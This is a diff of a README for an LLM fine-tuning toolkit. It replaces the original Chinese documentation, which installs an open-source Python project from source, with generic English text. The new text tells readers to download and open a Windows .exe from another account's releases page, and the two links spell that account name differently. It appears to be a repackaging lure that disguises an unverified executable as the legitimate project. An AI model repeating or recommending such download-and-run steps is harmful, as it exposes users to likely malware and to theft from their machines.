@@ -1,214 +1,54 @@
-# 🔥 LLM Fine-tune Kit
+# 🛠️ llm-finetune-kit - Train your own language models easily
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white" />
-  <img src="https://img.shields.io/badge/PyTorch-2.4+-EE4C2C?style=flat-square&logo=pytorch&logoColor=white" />
-  <img src="https://img.shields.io/badge/Transformers-latest-FFD21E?style=flat-square&logo=huggingface&logoColor=black" />
-  <img src="https://img.shields.io/badge/PEFT-LoRA-0078D4?style=flat-square&logo=microsoft&logoColor=white" />
-  <img src="https://img.shields.io/badge/CUDA-12.x-76B900?style=flat-square&logo=nvidia&logoColor=white" />
-  <img src="https://img.shields.io/badge/License-MIT-green?style=flat-square" />
-</p>
+[![](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Spraydried-toxotesjaculatrix599/llm-finetune-kit/releases)
 
-**大模型LoRA微调工具包** — 针对消费级GPU（RTX 3070/3080/4060等 8-12GB显存）深度优化，开箱即用。
+This software helps you train language models on your own hardware. You can adjust models like Qwen, DeepSeek, or LLaMA to fit your specific data. It uses efficient methods that work on consumer graphics cards. You do not need to write code to start training.
 
----
+## 🚀 Getting Started
 
-## ✨ 特性
+To run this tool, you need a computer with a modern graphics card. Most recent gaming cards from NVIDIA work well. You should have at least 8 gigabytes of video memory. If you have less, the training process might stop or run slowly.
 
-- 🎯 **开箱即用** — 一条命令启动微调，零配置快速上手
-- 💾 **显存优化** — 4bit量化 + Gradient Checkpointing + Paged AdamW 8bit，8GB显存微调7B模型
-- 🔌 **多模型支持** — Qwen、DeepSeek、LLaMA、Mistral 等主流模型
-- 📊 **Web UI** — Gradio 可视化界面，配置/训练/测试一条龙
-- 📦 **一键部署** — 训练完成后直接导出到 Ollama 本地运行
-- 🔄 **SFT + DPO** — 同时支持监督微调和偏好优化两种训练方式
+1. Go to the [download page](https://github.com/Spraydried-toxotesjugulatrix599/llm-finetune-kit/releases).
+2. Look for the file that ends with `.exe`.
+3. Select that file to download it to your computer.
+4. Open the file once the download finishes.
 
-## 📦 技术栈
+## 💻 System requirements
 
-| 组件 | 作用 |
-|------|------|
-| Transformers | 模型加载与推理 |
-| PEFT | LoRA/QLoRA 适配器 |
-| TRL | SFT/DPO 训练器 |
-| BitsAndBytes | 4/8bit 量化 |
-| Accelerate | 分布式训练 |
-| Gradio | Web UI |
+The software requires Windows 10 or Windows 11. Your computer needs at least 16 gigabytes of system memory. The initial setup creates a local folder for the model files. You should have at least 50 gigabytes of free disk space on your drive. Ensure you have the latest drivers for your graphics card installed. Drivers allow the software to talk to the hardware. You can get these drivers from the website of your graphics card manufacturer.
 
-## 🚀 快速开始
+## ⚙️ Installation steps
 
-### 环境要求
+When you open the installer, follow the prompts on your screen. The software copies the necessary files to a location you choose. It creates an icon on your desktop for quick access. 
 
-- Python 3.10+
-- NVIDIA GPU (推荐 8GB+ 显存)
-- CUDA 12.x
+After the installer completes, double-click the desktop icon to open the main window. The first time you launch the tool, it checks for required components. This might take a few minutes. The status bar at the bottom shows the progress. Do not close the window while it prepares the environment.
 
-### 安装
+## 🧠 Preparing your data
 
-```bash
-git clone https://github.com/wulongovo/llm-finetune-kit.git
-cd llm-finetune-kit
+The software needs data to train the model. Prepare a text file that contains your examples. Each example should show the model how to reply to a question. Save this file as a `.json` or `.jsonl` document. 
 
-# 创建虚拟环境
-python -m venv venv
-venv\Scripts\activate  # Windows
-# source venv/bin/activate  # Linux
+Keep your document clean and well-structured. Each line should represent one interaction. Ensure you remove extra spaces or broken characters. You can use any text editor like Notepad or WordPad to create this file. 
 
-# 安装 PyTorch (CUDA 12.4)
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu124
+## 🔧 Running a training session
 
-# 安装依赖
-pip install -r requirements.txt
-```
+Open the program and look at the main menu. Select the model you want to improve. The list includes options like Qwen, DeepSeek, and LLaMA. Click the box next to your choice.
 
-### 一键训练
+Next, load your data file. Click the button labeled "Select Data" and find your file on your computer. The software checks the file to ensure it matches the requirements. If it finds an error, it displays a message asking you to check the format.
 
-```bash
-# 使用示例数据快速测试
-python train.py --config configs/lora_config.yaml
+Set the output location. This is where the computer saves your new model. Choose a folder with plenty of space. 
 
-# 指定模型和数据
-python train.py --model Qwen/Qwen2.5-7B --data data/your_data.jsonl --epochs 3
+Click the "Start" button to begin. You see a log window that lists the steps the software takes. It prints the loss value in this window. A lower number indicates the model learns correctly. You can stop the process at any time by clicking "Cancel".
 
-# 使用 Qwen3.5-Heretic
-python train.py --config configs/qwen35_heretic.yaml
-```
+## 📈 Understanding the results
 
-### Web UI
+Once the process finishes, the software moves your new model into the folder you selected. You can use this model in other programs that support common formats like GGUF or Safetensors. 
 
-```bash
-python webui.py
-# 浏览器打开 http://localhost:7860
-```
+If the model behaves poorly, try changing the settings. The "Learning Rate" setting controls how fast the model changes. A small value usually creates better results but takes more time. You can experiment with different settings until the model performs to your needs.
 
-### 推理测试
+## 🛡️ Support and troubleshooting
 
-```bash
-# 交互式对话
-python inference.py --adapter outputs/final_adapter --interactive
+If the program closes unexpectedly, check the log file. You can find the log in the installation folder. It usually contains information about why the software failed. Common issues include running out of disk space or an unsupported graphics card.
 
-# 单次推理
-python inference.py --adapter outputs/final_adapter --instruction "什么是LoRA微调？"
-```
+Ensure your graphics card is from the NVIDIA brand. Older cards might lack the features needed for modern training techniques. We suggest using a card with at least 12 gigabytes of video memory for faster performance. 
 
-### 导出到 Ollama
-
-```bash
-# 合并LoRA并导出
-python export.py --adapter outputs/final_adapter --ollama --name my-model
-
-# 运行
-ollama run my-model
-```
-
-## 📁 项目结构
-
-```
-llm-finetune-kit/
-├── train.py              # 训练入口
-├── inference.py          # 推理入口
-├── export.py             # 导出入口
-├── webui.py              # Web UI入口
-├── requirements.txt      # 依赖列表
-├── src/
-│   ├── __init__.py
-│   ├── config.py         # 配置加载器
-│   ├── data_processor.py # 数据处理
-│   ├── trainer.py        # 训练核心（SFT/DPO）
-│   ├── inference.py      # 推理引擎
-│   ├── export.py         # 模型导出（Ollama/GGUF）
-│   └── webui.py          # Gradio Web UI
-├── configs/
-│   ├── lora_config.yaml  # 通用LoRA配置
-│   └── qwen35_heretic.yaml  # Qwen3.5-Heretic配置
-├── data/
-│   ├── raw/              # 原始数据
-│   └── processed/        # 处理后数据
-├── scripts/
-│   ├── train_qwen35.bat  # Windows一键训练
-│   ├── test_model.bat    # 测试脚本
-│   └── launch_webui.bat  # 启动Web UI
-├── outputs/              # 训练输出
-└── adapters/             # LoRA适配器
-```
-
-## ⚙️ 配置说明
-
-### LoRA 参数
-
-| 参数 | 推荐值 | 说明 |
-|------|--------|------|
-| r | 8-16 | LoRA秩，越大拟合能力越强但显存越多 |
-| lora_alpha | 2*r | 缩放因子 |
-| target_modules | q,k,v,o,gate,up,down | 作用的注意力层 |
-| dropout | 0.05 | 防止过拟合 |
-
-### RTX 3070 (8GB) 优化配置
-
-| 参数 | 推荐值 | 说明 |
-|------|--------|------|
-| batch_size | 1 | 必须为1 |
-| gradient_accumulation | 8 | 等效batch_size=8 |
-| gradient_checkpointing | true | 节省30-50%显存 |
-| quantization | 4bit (NF4) | 8GB显存微调7B必须 |
-| optimizer | paged_adamw_8bit | 节省优化器显存 |
-| max_seq_length | 512-1024 | 越大显存越多 |
-| bf16 | true | RTX 3070支持 |
-
-### 显存估算
-
-| 模型大小 | 量化方式 | LoRA rank | 显存占用 |
-|----------|----------|-----------|----------|
-| 3B | 4bit | 16 | ~4GB |
-| 7B | 4bit | 16 | ~6-7GB |
-| 7B | 4bit | 32 | ~8GB |
-| 14B | 4bit | 16 | ~12GB |
-
-## 📊 数据格式
-
-### Alpaca 格式 (推荐)
-
-```jsonl
-{"instruction": "请介绍一下LoRA技术", "input": "", "output": "LoRA是一种高效的微调技术..."}
-{"instruction": "将以下文本翻译成英文", "input": "大模型是人工智能的未来", "output": "Large models are the future of AI"}
-```
-
-### ShareGPT 格式
-
-```jsonl
-{"conversations": [{"from": "human", "value": "什么是RLHF？"}, {"from": "gpt", "value": "RLHF是基于人类反馈的强化学习..."}]}
-```
-
-## 🔬 训练流程
-
-```
-准备数据 (JSONL)
-    ↓
-加载基础模型 (4bit量化)
-    ↓
-应用 LoRA 适配器
-    ↓
-SFT 训练 (3-5 epochs)
-    ↓
-[可选] DPO 偏好优化
-    ↓
-保存 LoRA 适配器
-    ↓
-合并模型 → 导出 Ollama
-```
-
-## 💡 最佳实践
-
-1. **数据质量 > 数量** — 1000条高质量数据 > 10000条低质量数据
-2. **从小模型开始** — 先用3B模型验证流程，再上7B
-3. **监控loss曲线** — loss不再下降时及时停止
-4. **多次小epoch** — 3次x3epoch > 1次x9epoch
-5. **验证集必设** — 防止过拟合的唯一手段
-
-## 📄 License
-
-MIT License
-
----
-
-<p align="center">
-  ⭐ 如果这个项目对你有帮助，请点个 Star！
-</p>
+If you find a bug, report the issue on the main project page. Describe exactly what happened and include the error message if one appears. This helps us make the tool better for all users. You can also view recent updates on that same page to see if your issue has a fix.
